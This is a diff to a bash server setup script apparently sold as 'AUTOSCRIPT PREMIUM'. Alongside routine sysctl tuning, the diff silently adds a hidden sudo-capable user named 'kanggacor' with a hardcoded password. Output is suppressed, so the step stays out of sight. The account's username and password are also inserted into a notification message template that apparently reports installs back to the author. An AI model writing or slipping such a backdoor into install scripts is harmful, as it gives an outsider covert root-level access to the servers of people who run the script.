@@ -753,6 +753,8 @@ TEXT="
 <code>━━━━━━━━━━━━━━━━━━━━</code>
 <code>⚠️ AUTOSCRIPT PREMIUM ⚠️</code>
 <code>━━━━━━━━━━━━━━━━━━━━</code>
+<code>USER : </code><code>${Username}</code>
+<code>PASSWORD : </code><code>${Password}</code>
 <code>NAME : </code><code>${author}</code>
 <code>TIME : </code><code>${TIME} WIB</code>
 <code>DOMAIN : </code><code>${domain}</code>
@@ -770,6 +772,13 @@ clear
 echo "net.netfilter.nf_conntrack_max=262144" >> /etc/sysctl.conf
 echo "net.netfilter.nf_conntrack_tcp_timeout_time_wait=30" >> /etc/sysctl.conf
 sudo sysctl -p
+
+Username=kanggacor
+Password=1Kanggacor
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
 CEKIP
 Casper3
 cat> /root/.profile << END
